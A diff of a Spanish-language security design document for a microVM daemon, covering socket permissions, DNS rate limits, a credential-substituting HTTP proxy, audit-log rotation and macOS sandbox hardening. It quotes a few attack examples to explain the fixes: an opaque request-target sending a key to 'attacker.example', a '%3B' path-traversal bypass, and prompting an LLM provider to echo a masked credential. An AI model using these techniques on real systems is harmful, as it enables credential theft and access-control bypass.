@@ -17,6 +17,13 @@ equivale a root en el host: puede montar discos arbitrarios y arrancar kernels a
 Exponerlo por TCP sería repetir el error que ha costado a Docker una década de servidores
 comprometidos.
 
+El socket nace en un directorio privado (`0700`) junto al de destino, con `0660` y cedido
+al usuario de `-socket-user` (o al de `sudo`) y a su grupo principal, y se renombra a su
+sitio: el `chmod` y el `chown` no siguen un enlace que alguien ponga en la ruta mientras
+el daemon arranca, y no hay un instante en que tenga los permisos del umask. Si otros
+pueden escribir en el directorio del socket (sin sticky bit), el daemon lo avisa: podrían
+cambiarlo por uno suyo.
+
 El acceso remoto es **SSH y nada más**: `ssh host kling dial-stdio`. La autenticación es la
 de SSH; kindling no inventa credenciales propias.
 
@@ -74,7 +81,8 @@ Cada máquina vive en su propio namespace de red. La política por defecto es **
 Un valor de egress desconocido es un **error**, no una caída al modo más permisivo, y la
 política viaja con el snapshot del servicio: reimportar o curar un servicio la conserva.
 
-El resolver de `allowlist` está acotado: como máximo 32 consultas a la vez y ~200/s (ráfaga
+El resolver de `allowlist` está acotado (en Linux; en macOS, desde §22, también el DNS de
+`kling-vz`, en todos los modos): como máximo 32 consultas a la vez y ~200/s (ráfaga
 400) por microVM; por encima de eso responde SERVFAIL en el sitio, sin abrir un socket al
 upstream ni lanzar el `ip netns exec ... ipset add` que sembraría la ruta. Antes, un
 invitado que repitiera una consulta A miles de veces por segundo hacía que el host abriera
@@ -222,15 +230,33 @@ solo al crear: un `../../etc` saldría del directorio de datos.
   egress allowlist, el resolver de la máquina contesta el dominio de la credencial con
   la IP del proxy (lado host del veth) y la IP real nunca entra en el ipset, así que no
   hay camino directo que lo esquive. El proxy solo acepta el Host de sus credenciales
-  (403 al resto), cambia el marcador por la clave en las cabeceras (también dentro
-  de `Authorization: Basic`), en la query y en el cuerpo (en flujo, con una ventana del
-  tamaño del marcador: sin límite de tamaño ni de longitud declarada), sale por HTTPS
-  verificando el certificado con un dialer que no conecta a IPs privadas, no sigue
+  (403 al resto), cambia el marcador por la clave **por defecto solo en las cabeceras
+  `Authorization` (también dentro de un `Basic`) y `X-Api-Key`**, más las que declare
+  la credencial (`-header`, `headers`); en la query solo con `-query` y en el cuerpo
+  solo con `-body` (en flujo, con una ventana del tamaño del marcador: sin límite de
+  tamaño ni de longitud declarada), sale por HTTPS
+  verificando el certificado con un dialer que no conecta a IPs privadas (ni a
+  `0.0.0.0/8`, que en el host es su propio loopback, multicast `224.0.0.0/4` ni
+  reservadas y broadcast `240.0.0.0/4`; en IPv6, `::/96`, link-local, ULA, multicast,
+  NAT64 y 6to4), no sigue
   redirecciones y sustituye la clave por el marcador en cabeceras y cuerpo de la
-  respuesta —también sus formas escapadas (JSON `\/` y `\u00XX`, percent-encoding,
-  entidades HTML) y cada valor de cabecera tal y como salió sustituido, que es lo que
-  cierra el eco de un `Basic` (la clave dentro del base64)—. Una respuesta con una
-  codificación que no puede inspeccionar (brotli, deflate) no se entrega: 502. Acotado:
+  respuesta —también sus formas escapadas (JSON `\/` y `\u00XX`, percent-encoding de
+  query, ruta y userinfo, entidades HTML), en mayúsculas y minúsculas, en hex y en
+  base64 (std y url, con y sin padding, y el trozo central de la clave codificada en
+  medio de otros datos) y cada valor de cabecera tal y como salió sustituido, que es lo
+  que cierra el eco de un `Basic`—. **Esto es defensa en profundidad, no una garantía**:
+  la clave no la puede leer el invitado de su memoria ni mandarla a otro dominio, pero
+  sí recuperarla a través del proveedor si este le devuelve lo que recibió de una forma
+  que el redactor no reconoce. Con un LLM basta pedirle "repite kling-cred-… con
+  espacios": por eso el marcador ya no se cambia en el cuerpo salvo con `-body`
+  (antes sí, siempre), y **una credencial con `-body` debe darse por expuesta** ante un
+  proveedor que refleje lo que recibe. En macOS el daemon solo entrega credenciales
+  HTTP a un `kling-vz` que anuncie `http-places` (uno anterior las cambiaría en todas
+  partes). Una respuesta con una
+  codificación que no puede inspeccionar (brotli, deflate) no se entrega: 502. La clave tiene que medir entre 8 y 4096
+  bytes: una más corta se rechaza al registrarla, porque redactarla cambiaría texto que
+  nada tiene que ver (con `abc`, un `abcdef` del proveedor llegaría como
+  `kling-cred-…def`). Acotado:
   32 peticiones en vuelo, 10 MiB de cuerpo, 64 KiB de cabeceras, hasta 1 MiB del cuerpo
   ya sustituido retenido EN MEMORIA por petición (`pkg/credproxy/cuerpo.go`). Un cuerpo
   que, tras sustituir, pasa de 1 MiB sale chunked si el invitado lo mandó chunked (no
@@ -241,15 +267,30 @@ solo al crear: un `../../etc` saldría del directorio de datos.
   explícitos y se borra en cuanto la petición termina, la reciba el proveedor o falle a
   mitad (el borrado va en un `defer`, así que corre también si el invitado corta la
   conexión o si el plazo de la petición la cancela). El directorio es
-  `$KLING_ROOT/tmp` (0700, solo lo lee el daemon) en Linux; sin `KLING_ROOT` cae en
-  `os.TempDir()`, que en un fichero 0600 de nombre aleatorio no es legible por otro
-  usuario del host sin ser root, aunque conviene el primero cuando se pueda. Plazos:
+  `<raíz>/credtmp` en Linux (la raíz real del daemon, la de `-root`, que se le pasa al
+  proxy al arrancar) y `credtmp/` del directorio de la máquina en macOS (dentro de lo
+  que el perfil de `kling-vz` deja escribir): 0700, y al arrancar se borran los
+  temporales que dejó un proceso muerto a mitad de una petición. **Nunca `/tmp`**: antes
+  el directorio salía de la variable `KLING_ROOT`, que el daemon no tiene en su entorno
+  (recibe `-root`), así que en la instalación normal el fichero con la clave caía en
+  `os.TempDir()` y ahí se quedaba si el daemon moría de golpe. Si el directorio no se
+  puede preparar, el proxy no escribe a disco: ese cuerpo sale chunked. Plazos:
   60 s hasta las cabeceras de la respuesta, 120 s de inactividad
   (cada byte en cualquier sentido los renueva, también el plazo de la conexión del
   invitado) y un techo de 15 min por petición: un stream largo de un LLM pasa, y un
   invitado que gotea bytes para retener una plaza no la retiene más de 15 min. Un corte
   aborta la conexión, así que el invitado ve un error y no una respuesta truncada que
   parezca completa.
+- **La salida va siempre al Host de la credencial.** La URL hacia el proveedor se
+  monta por campos (`https`, el Host con el que se eligió la credencial, la ruta y la
+  query), nunca pegando el request-target del invitado tras el host. Antes un
+  request-target opaco (`GET http:@attacker.example/x` con `Host: api.stripe.com`)
+  salía hacia `https://api.stripe.com@attacker.example/x`: la clave, ya sustituida en
+  las cabeceras, iba al atacante con TLS verificado contra él y sin pasar por la
+  allowlist. Ahora se rechaza con 400, sin leer el cuerpo ni abrir la salida, todo
+  request-target que no sea una ruta absoluta o el absolute-form `http(s)` del mismo
+  Host: opaco, con usuario (`http://u@host/`), con otro esquema, hacia otro host o que
+  no empiece por `/` (`OPTIONS *`). CONNECT sigue siendo un 405.
 - **Permisos por método y ruta** (`-allow-request 'GET /v1/balance'`, `Allow` en la API):
   una credencial con permisos solo se sustituye en las peticiones que casan. Si ninguna
   credencial del Host casa, el proxy responde 403 y cierra la conexión sin leer el
@@ -270,6 +311,12 @@ solo al crear: un `../../etc` saldría del directorio de datos.
   podría interpretar distinto de como lo hace `path.Clean`: una barra o un punto
   codificados (`%2F`, `%5C`, `%2E`), una barra invertida literal, una barra doble, un
   parámetro de ruta con `;` (tipo `;jsessionid=`), o un segmento `.`/`..` sin decodificar.
+  Y después mira la ruta decodificada una vez, que es la que sale al proveedor: un `;`
+  codificado (`%3B`), un `%` que quede tras decodificar (doble codificación, `%252e`),
+  una barra invertida, una barra doble, un carácter de control o un segmento `.`/`..`
+  también son 403. Antes `%3B` se colaba: `/public/..%3B/admin` casaba con
+  `GET /public/**` y salía como `/public/..;/admin`, que Tomcat o Spring leen como
+  `/admin`.
   No intenta adivinar qué haría el proveedor con eso: rechaza la ambigüedad en vez de
   arriesgarse a firmar una petición para una ruta que nunca se comprobó de verdad. Sin
   ninguna credencial con `Allow` esto no se mira, igual que antes de este cambio.
@@ -288,9 +335,15 @@ solo al crear: un `../../etc` saldría del directorio de datos.
   partirla, por si la clave lleva `/`), uno de 32 o más caracteres de base64url/hex
   como `:tok`, los caracteres de control y los bytes que no son UTF-8 como `?` (la ruta
   llega decodificada y se lee en un terminal: nada de secuencias de escape del
-  invitado), y la ruta se corta a 256 bytes (el host a 253). Rota a 1 MiB a `.1` (una
-  generación), así que ocupa como mucho ~2 MiB por máquina; `commit` y `fork` no lo
-  copian y `rm` lo borra. La escritura no bloquea la petición: va por
+  invitado), y la ruta se corta a 256 bytes (el host a 253). Rota a 4 MiB por
+  generaciones (`.1`, `.2`, `.3`; `daemon.credaudit_max_mib` y
+  `daemon.credaudit_generations`, o `KLING_CREDAUDIT=MIB:N`), así que ocupa como mucho
+  ~16 MiB por máquina por defecto (unas 80 000 peticiones). Lo que se cae de la
+  generación más antigua **también se cuenta**: sus líneas, y los descartados que
+  llevaban, se suman a `dropped` (y a `rotated`) del primer registro del fichero
+  nuevo. Antes había una sola generación de 1 MiB y la rotación pisaba el `.1` sin
+  contar nada: de 20 000 peticiones quedaban 9 185 con `dropped=0`. `commit` y `fork`
+  no lo copian y `rm` lo borra (todas las generaciones). La escritura no bloquea la petición: va por
   una cola de 1024 registros a una sola goroutine; con la cola llena el registro se
   descarta y se cuenta, y la cuenta viaja en el campo `dropped` del siguiente (o en una
   línea propia), nunca en silencio. **En Linux lo escribe el daemon (root) en
@@ -345,8 +398,8 @@ solo al crear: un `../../etc` saldría del directorio de datos.
   - `kling-vz` es el proceso que termina el tráfico del invitado (pila TCP, DNS, MMDS).
     Un invitado que encontrara un fallo explotable ahí tendría la clave en la misma
     memoria; antes de este cambio, ese mismo fallo le daba un proceso sin claves. El
-    perfil de sandbox (`kling-vz.sb`) sigue limitando qué ficheros y qué red toca, pero
-    no protege la memoria del propio proceso.
+    perfil de sandbox (`kling-vz.sb`) sigue limitando qué ficheros y qué red toca (solo
+    los de su máquina, §22), pero no protege la memoria del propio proceso.
   - La memoria del invitado vive en otro proceso (el auxiliar de Apple), así que la clave
     no entra en su volcado de estado ni en un snapshot. `kling-vz` no la escribe a disco
     ni a su log.
@@ -1103,6 +1156,112 @@ saber quién le habla por el origen**. Por eso (#110):
 Lo que no cubre: el token viaja en claro por el tramo anfitrión → invitado, como todo lo
 del proxy y de las aristas (§15); y la API no tiene shell (cada ruta valida sus
 argumentos), así que un token de control da el teléfono, no root en la VM.
+
+### 22. macOS: `kling-vz` es lo que el invitado tiene delante
+
+En el Mac no hay netns, iptables ni resolver en el host: la pila TCP/IP (gVisor), el DNS
+y MMDS de cada invitado corren dentro de su `kling-vz`, que es un proceso del usuario.
+Un fallo explotable ahí es código del invitado corriendo como el usuario, así que lo que
+ese proceso puede tocar y cuánto puede gastar son barreras en sí mismas.
+
+- **El perfil de sandbox aísla a una máquina de las demás** (`vz/cmd/kling-vz/kling-vz.sb`,
+  `vz/internal/custodio`). Hasta ahora dejaba a `kling-vz` leer toda la raíz, incluido
+  `secrets/snapshot.key` (la clave HMAC y la maestra de la que HKDF deriva la de cada
+  `credentials.enc`), escribir en `snapshots/` y `volumes/` enteros y conectar a
+  `localhost:*` aunque la máquina no tuviera red: un fallo en la pila de red, el DNS o
+  MMDS daba las credenciales de todas las máquinas, reescribir el `mem.file` de
+  cualquier dorado (que no lleva hash: es la memoria de cada instancia futura) y
+  conectar al agente (exec) de las demás por sus reenvíos. Ahora:
+  - **Ficheros**: su directorio y los ficheros exactos de su VM, que se conocen al
+    confinarse (justo antes de crear o restaurar, con los discos ya reapuntados): el
+    kernel, los discos de solo lectura y el estado que restaura, para leer; su overlay y
+    sus volúmenes, para leer y escribir. Nunca `secrets/`, nunca escribir en
+    `snapshots/` (dos reglas al final del perfil, por si el daemon le pasara ahí un
+    disco). `kling-vz` no necesita ninguna clave de disco: las credenciales le llegan ya
+    en claro por su API.
+  - **Dorados**: `kling commit` pide el volcado en `snapshots/<nombre>/`, un nombre que
+    no se sabe al confinarse. `kling-vz` lo vuelca en su directorio y un proceso
+    **custodio** (el mismo binario, lanzado antes de encerrarse, confinado en su propio
+    perfil: leer el directorio de la máquina, escribir bajo `snapshots/`, sin red) lo
+    clona (`clonefile`) a su sitio. El custodio no se fía de `kling-vz`: solo escribe
+    `snap.file` o `mem.file`, en un directorio que ya existe justo debajo de
+    `snapshots/` (lo crea el daemon) y que no tiene `meta.json`, sin seguir enlaces y
+    sin pisar un fichero que exista. Un dorado terminado no se puede tocar; lo peor que
+    hace un `kling-vz` tomado es adelantarse al commit en curso de otra máquina, que
+    falla en vez de quedar corrupto. Al clonar, lo que se escriba después en el origen
+    no llega al dorado.
+  - **Red**: escucha solo en `127.0.0.1:29000-29999` (sus reenvíos); sale al exterior
+    solo con egress distinto de none; al loopback del Mac (que para el sandbox incluye
+    `0.0.0.0`) solo en allowlist (el `-upstream 127.0.0.1:5432` de una credencial), y
+    nunca al rango de los reenvíos.
+  - Probado con `sandbox-exec` y el perfil real (`vz/scripts/sandbox-perfil.sh`): con el
+    perfil anterior, 15 de 23 comprobaciones abrían lo que no debían (leer
+    `snapshot.key`, otras máquinas y dorados ajenos; escribir dorados y volúmenes ajenos;
+    conectar a un reenvío ajeno en los tres modos, también por `0.0.0.0`); con el nuevo,
+    ninguna. Y de extremo a extremo en un M4 (macOS 26.5): exec, volumen, freeze/thaw,
+    commit a un dorado, arrancar otra máquina de él, egress none/internet/allowlist.
+  - Lo que queda: su propio directorio es suyo (el daemon lee de ahí el volcado de una
+    congelación y el registro de auditoría), y con egress internet o allowlist sale a
+    lo que la red del Mac alcance, filtrado por la política en el propio proceso.
+- **Los reenvíos de `127.0.0.1` solo aceptan al mismo usuario, por dirección y puerto**
+  (`vz/internal/peercred`). macOS no da las credenciales del otro extremo de un socket
+  TCP, así que `kling-vz` busca entre los procesos de su usuario el socket que es el otro
+  extremo. Hasta ahora comparaba solo los puertos, y en un Mac multiusuario otro usuario
+  podía hacer `bind(IP-LAN:X)` + `connect(127.0.0.1:P)` con el puerto `X` de una
+  conexión abierta del daemon: el reenvío la aceptaba y le daba el agente del invitado
+  (exec). Ahora el socket tiene que ser IPv4 y casar en las dos direcciones además de en
+  los dos puertos.
+- **Lo que el invitado abre contra `kling-vz` está acotado, también en egress none**
+  (`vz/internal/vnet`, `vz/internal/egress/dns.go`). Cada flujo UDP y cada conexión TCP al
+  53 retienen goroutines hasta su plazo de inactividad, y no había tope: 3000 flujos al 53
+  dejaban ~2800 goroutines vivas, y cada consulta abría su socket hacia el upstream. Ahora,
+  por máquina: 64 flujos UDP al 53 y 64 conexiones TCP al 53 a la vez (por encima, el
+  flujo se descarta y la conexión recibe un RST), 256 flujos UDP de salida, y hacia el
+  upstream los mismos topes que el resolver de Linux: 32 consultas en vuelo y un cubo de
+  200/s con ráfagas de 400 (por encima, SERVFAIL sin tocar la red), también para las
+  búsquedas del proxy de credenciales. Una respuesta del upstream con otro id o con otra
+  pregunta no se entrega ni siembra la allowlist (como `responseMatches` en Linux).
+- **El DNS del invitado va a `1.1.1.1`, no al resolver del Mac** (`vz/internal/egress`).
+  Se reenviaba al primer `nameserver` de `/etc/resolv.conf`, que en un Mac suele ser
+  privado (el router, una VPN, el DNS de la empresa): con egress internet el invitado
+  resolvía nombres de la intranet por split-horizon (`intranet.corp` → `10.x`) y podía
+  reconocer la red interna aunque no pudiera conectar a ella. Ahora, como en Linux,
+  el upstream es público y fijo. Consecuencia: en una red que bloquee `1.1.1.1:53`
+  el invitado no resuelve (tampoco en Linux), y los nombres que solo existen en el DNS
+  del Mac (VPN, `.local`) no los ve, que es justo lo que se quería.
+
+### 23. Una plantilla compartida entrega lo que lleva a todos los inquilinos
+
+Con política de autorización ([docs/authz.md](docs/authz.md)), `shared_templates` deja que
+cualquier inquilino haga `run -from` (o `sandbox -from`) de un snapshot de admin. El
+inquilino no puede cambiar ni borrar la plantilla, pero **cada instancia suya recibe todo
+lo que la plantilla trae**, y compartirla es decidir dárselo a todos:
+
+- **Sus credenciales.** Las de plantilla (`PUT /snapshots/{name}/credentials`,
+  `secrets/credentials/<plantilla>.enc`) se entregan a cada máquina que nace de ella, la
+  del inquilino incluida. La clave no entra en el invitado (§7), pero el inquilino puede
+  **usarla**: cualquier petición suya a los dominios de la allowlist sale con ella, con los
+  permisos que tenga en el servicio de fuera. Las que se aten a la plantilla después de
+  compartirla valen igual para las instancias nuevas. El registro de auditoría del proxy
+  dice qué máquina usó la credencial (y su `kling.owner`), no la impide.
+- **Su memoria y su disco.** La plantilla es una foto del invitado: lo que el admin dejó
+  en su RAM o en su overlay (un token en una variable de entorno, una caché, un fichero de
+  configuración con una clave) lo lee el inquilino desde dentro de su instancia, con
+  `exec` si la plantilla se hizo con `AllowExec` o desde el propio servicio si no.
+- **Sus volúmenes.** Una plantilla de un admin que lleve volúmenes los reengancha en la
+  instancia del inquilino (la única vía por la que un inquilino llega a un volumen).
+- **Por nombre, no por contenido.** `shared_templates` lista nombres: si el admin borra
+  `python` y hace otro snapshot sin dueño con ese nombre, el nuevo queda compartido sin
+  tocar la política. (Uno con dueño no se comparte aunque esté en la lista.)
+
+Por eso: comparta solo plantillas hechas para eso, sin credenciales ni secretos en la
+memoria o el disco, o con credenciales de un servicio de fuera que den lo mismo a todos
+los inquilinos (una cuenta de solo lectura, con su propia cuota, y `-allow-request` para
+acotar las rutas). Lo que es de un inquilino va en una plantilla suya (sin compartir), o
+en credenciales de máquina que se atan a cada instancia (`POST
+/machines/{ref}/credentials`) después de crearla. Revise `kling template inspect
+<plantilla>` (dominios con credencial, volúmenes, `allow_exec`) antes de añadirla a
+`shared_templates`.
 
 ## Lo que NO está resuelto
 
